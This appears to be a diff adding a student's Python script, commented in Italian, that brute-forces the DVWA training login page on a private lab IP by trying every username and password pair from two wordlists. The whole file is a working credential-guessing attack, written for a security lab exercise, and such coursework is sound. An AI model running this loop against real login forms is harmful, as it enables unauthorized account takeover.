@@ -1,0 +1,29 @@
+import http.client, urllib.parse
+
+username = open('usernames.txt')
+password = open('passwords.txt')
+
+lista_u = username.readlines()
+lista_psw = password.readlines()
+
+print("Attendere prego, programma in esecuzione")
+
+for user in lista_u :
+	user = user.rstrip()
+	for pwd in lista_psw :
+		pwd = pwd.rstrip()
+		
+		#print(user, "-", pwd)
+		post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': "Login"})#spiegare concetto creazione incapsulamento parametri
+		headers = {"Content-type": "application/x-www-form-urlencoded", "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}#capire come reperire questi dati in header
+		conn = http.client.HTTPConnection("192.168.50.101", 80)#iserire manualmente i dati IP,port
+		conn.request("POST", "/dvwa/login.php", post_parameters, headers) 
+		response = conn.getresponse()
+		print("Sei qui : ", response.getheader('location'))#verificare posizione durante accesso
+		
+		if(response.getheader('location') == "index.php") : 
+			login_u = (user)
+			login_p = (pwd)
+
+print("Questo e' l'utente :" ,login_u)
+print("Questo e' la password :" ,login_p)
